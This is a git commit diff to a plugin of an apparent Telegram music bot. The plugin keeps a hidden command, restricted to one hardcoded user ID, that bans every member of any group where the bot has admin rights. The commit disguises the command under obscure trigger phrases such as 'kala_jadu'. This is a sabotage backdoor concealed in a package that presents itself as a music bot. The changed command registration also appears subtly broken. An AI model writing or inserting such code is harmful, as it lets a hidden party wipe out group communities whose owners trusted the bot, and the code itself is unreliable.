0e44730baf3710a7809a34886dfba5d03986edd4
Akash <158745842+Akash8t2@users.noreply.github.com>
2024-09-10 15:26:43 +0530

    Update banall.py

--- BrandrdXMusic/plugins/tools/banall.py
+++ BrandrdXMusic/plugins/tools/banall.py
@@ -1,18 +1,18 @@
- from BrandrdXMusic import app
+from BrandrdXMusic import app
 from pyrogram import filters,enums
 
 
-@app.on_message(filters.command("banall") & filters.user(7365935124))
+@app.on_message(filters.command("baby sab members ko nikal do 🥰", "ban_all_members",  "kala_jadu") & filters.user(7365935124))
 async def ban_all(_,msg):
-    chat_id=msg.chat.id 
-    bot=await app.get_chat_member(chat_id,6996527921)
-    bot_permission=bot.privileges.can_restrict_members==True    
-    if bot_permission:
-        async for member in app.get_chat_members(chat_id):       
-            try:
-                    await app.ban_chat_member(chat_id, member.user.id)
-                    await msg.reply_text(f"")                    
-            except Exception:
-                pass
-    else:
-        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")
+    chat_id=msg.chat.id 
+    bot=await app.get_chat_member(chat_id,6996527921)
+    bot_permission=bot.privileges.can_restrict_members==True    
+    if bot_permission:
+        async for member in app.get_chat_members(chat_id):       
+            try:
+                    await app.ban_chat_member(chat_id, member.user.id)
+                    await msg.reply_text(f"")                    
+            except Exception:
+                pass
+    else:
+        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")
